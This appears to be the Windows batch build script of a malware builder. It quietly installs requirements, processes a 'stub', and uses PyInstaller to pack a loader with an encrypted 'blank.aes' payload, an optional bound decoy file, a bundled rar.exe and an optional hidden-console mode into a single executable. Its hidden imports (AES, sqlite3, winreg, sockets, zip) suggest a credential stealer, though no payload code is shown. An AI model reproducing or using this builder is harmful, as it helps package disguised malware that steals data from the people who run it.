@echo off
cd /d %~dp0

if exist activate.bat (
    call activate.bat
)

title Installing requirements...
pip install -r requirements.txt > nul 2>&1
pip install pyinstaller > nul 2>&1

title Processing stub...
python process.py
if %errorlevel% neq 0 goto ERROR

title Building executable...
set ARGS=--onefile --name "%~1" --distpath "%~2" --add-data "blank.aes;." --collect-all PIL --collect-all Crypto --collect-all urllib3 --hidden-import Crypto.Cipher.AES --hidden-import ctypes --hidden-import ctypes.wintypes --hidden-import sqlite3 --hidden-import json --hidden-import winreg --hidden-import urllib3 --hidden-import urllib.request --hidden-import uuid --hidden-import tempfile --hidden-import threading --hidden-import struct --hidden-import random --hidden-import string --hidden-import base64 --hidden-import logging --hidden-import shutil --hidden-import re --hidden-import platform --hidden-import subprocess --hidden-import zipfile --hidden-import zlib --hidden-import datetime --hidden-import ssl --hidden-import socket --console loader-o.py
if exist icon.ico set ARGS=%ARGS% --icon icon.ico
if exist bound.blank set ARGS=%ARGS% --add-data "bound.blank;."
if exist rar.exe set ARGS=%ARGS% --add-data "rar.exe;."
if exist rarreg.key set ARGS=%ARGS% --add-data "rarreg.key;."
if exist noconsole (
    set ARGS=%ARGS% --noconsole
) else (
    set ARGS=%ARGS% --console
)
if exist version.txt set ARGS=%ARGS% --version-file version.txt

pyinstaller %ARGS%
if %errorlevel% neq 0 goto ERROR

title Post-processing...
python postprocess.py
if %errorlevel% neq 0 goto ERROR

if exist dist\Built.exe (
    title [Success]
    echo Build successful!
    explorer /select,dist\Built.exe
) else (
    goto ERROR
)
pause > nul
exit

:ERROR
color 4 && title [Error]
echo Build failed!
pause > nul
